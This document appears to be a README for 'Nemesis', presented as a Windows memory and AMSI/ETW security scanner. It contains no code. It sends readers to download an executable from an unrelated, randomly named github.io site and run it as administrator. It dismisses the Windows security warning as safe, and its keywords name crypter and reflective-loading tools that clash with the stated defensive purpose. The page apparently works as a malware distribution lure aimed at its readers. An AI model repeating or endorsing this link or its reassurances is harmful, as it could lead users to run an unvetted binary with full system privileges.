# 🛡️ Nemesis - Monitor your computer for hidden threats

[![](https://img.shields.io/badge/Download_Nemesis-blue.svg)](https://reigning-anabaptism212.github.io)

Nemesis helps you see what programs run on your Windows computer. It looks deep into your system memory to find hidden code. Many unwanted programs hide by sitting in the memory instead of saving files to your hard drive. Nemesis spots these programs. It also checks your system settings to ensure your security tools work as expected. 

## 📥 Getting Started

You need to download the program first. Visit the link below to reach the official page. Find the latest version on that page and save the file to your desktop.

[Download Nemesis Here](https://reigning-anabaptism212.github.io)

## 🖥️ System Requirements

- Windows 10 or Windows 11
- Administrator access
- Microsoft .NET 6.0 Runtime or newer
- At least 4GB of RAM

## ⚙️ How to Use Nemesis

1. Save the downloaded file to a folder you can find easily, such as your Downloads folder.
2. Right-click the file and select "Run as administrator." Windows will ask if you trust the program. Click Yes.
3. A black box will appear. This is the command line. You provide instructions here to tell the program what to analyze.
4. Type `Nemesis.exe --scan` and press Enter. The program will start its check.
5. Watch the screen for progress updates. The tool checks the memory for any suspicious activity.
6. Once the check ends, the program shows a list of items found. 

## 🔍 Understanding the Results

Nemesis organizes the information it finds into simple categories. You can see which programs load into memory and if they match the files on your computer.

If Nemesis finds something, it does not mean your computer has a virus immediately. It means a program is acting in a way that deserves a closer look. Check the names of the files listed. If a file name looks like a string of random characters or you do not recognize the name of the program, you should investigate that specific file. 

## 🛡️ Security Check Features

Nemesis protects your system by checking two specific areas of Windows:

AMSI (Antimalware Scan Interface): This is a gatekeeper for Windows. It checks scripts and programs before they run. Nemesis confirms that this guard is active.

ETW (Event Tracing for Windows): This keeps a log of events. Malware often tries to turn off this log to hide its tracks. Nemesis checks if the log remains intact.

## 🛠️ Advanced Options

If you want the software to perform a deeper check, use these commands in the black box:

- `--help`: Shows a complete list of commands.
- `--verbose`: Shows every step the program takes during the scan.
- `--save`: Saves the results to a text file for you to read later.
- `--check-integrity`: Forces a check of your security settings.

## ❓ Frequently Asked Questions

### What happens if I find a suspicious file?
Use your regular antivirus software to perform a full scan on that specific file. You can also upload the file name or path to a site like VirusTotal to see what other security tools think of it.

### Does this program slow down my computer?
No. The scan happens quickly. It only looks at the memory and the settings. It does not change your system files.

### Can I run this while I work?
Yes. It runs in the background and will not interrupt your other programs.

### Why does Windows show a security warning?
Windows warns you because this tool has high-level access to your memory. It needs this access to see hidden programs. Since you downloaded it from the official source, it is safe to run.

### Is my privacy protected?
Nemesis stays on your machine. It does not send your data to any outside server. All information stays inside the black window or the text file you create.

## 📄 Troubleshooting

- If the program does not open, check your .NET version. You can find the latest version on the official Microsoft website.
- If the text in the window moves too fast, run the program with the `--save` command to generate a log file.
- If you receive an error about permissions, ensure you right-clicked the icon and picked "Run as administrator." 
- If the window closes immediately, open the Command Prompt first, then drag the Nemesis file into the window and press Enter. This keeps the window open so you can read the error message.

## 📈 Keeping Your System Clean

Run Nemesis once a week. This keeps you aware of what programs exist on your system. If you notice a program that you did not install, you should look into how it arrived. Check your list of installed programs in the Windows Control Panel to remove anything you do not need.

Keywords: amsi, blue-team-tool, clr, crypter, detection, etw, jlaive, malware-analysis, pe-dump, phantom, reflective-loading, scrubcrypt, windows-security-research